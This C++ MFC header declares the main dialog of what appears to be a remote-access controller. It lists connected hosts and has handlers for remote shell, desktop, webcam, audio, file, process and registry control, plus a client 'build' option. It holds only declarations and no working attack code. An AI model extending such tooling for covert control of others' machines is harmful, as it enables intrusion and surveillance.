
// PCRemoteDlg.h : 头文件
//

#pragma once
#include "afxcmn.h"
#include "tools/TrueColorToolBar.h"
#include "socket/IOCPServer.h"

// CPCRemoteDlg 对话框
class CPCRemoteDlg : public CDialogEx
{
// 构造
public:
	CPCRemoteDlg(CWnd* pParent = NULL);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_PCREMOTE_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()

private:
	void InitListCtrl();
	void AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing);
	void ShowMessageLog(bool bIsOK, CString strMsg);
	void CreatStatusBar(void);
	void Test();
	void CreateToolBar(void);
	void InitNotifyIconData();
private:
	CListCtrl m_CList_Online;  // 服务端连接后显示的列表控件
	CListCtrl m_CList_Message; // 日志列表控件
	CStatusBar  m_wndStatusBar;  //状态条
	int m_iCount;
	CTrueColorToolBar m_ToolBar;
	NOTIFYICONDATA m_notifyID; // 托盘
	CIOCPServer* m_iocpServer;
public:
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnNMRClickListOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineAudio();
	afx_msg void OnOnlineCmd();
	afx_msg void OnOnlineDesktop();
	afx_msg void OnOnlineFile();
	afx_msg void OnOnlineProcess();
	afx_msg void OnOnlineRegistry();
	afx_msg void OnOnlineServer();
	afx_msg void OnOnlineVideo();
	afx_msg void OnOnlineWindow();
	afx_msg void OnOnlineDelete();
	afx_msg void OnMainAbout();
	afx_msg void OnMainBuild();
	afx_msg void OnMainClose();
	afx_msg void OnMainSet();

	//自定义消息
	afx_msg void OnIconNotify(WPARAM wParam, LPARAM lParam);
	afx_msg void OnNotifyShow();
	afx_msg void OnNotifyClose();
	afx_msg void OnClose();

protected:
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	void Activate(UINT nPort, UINT nMaxConnections);
};
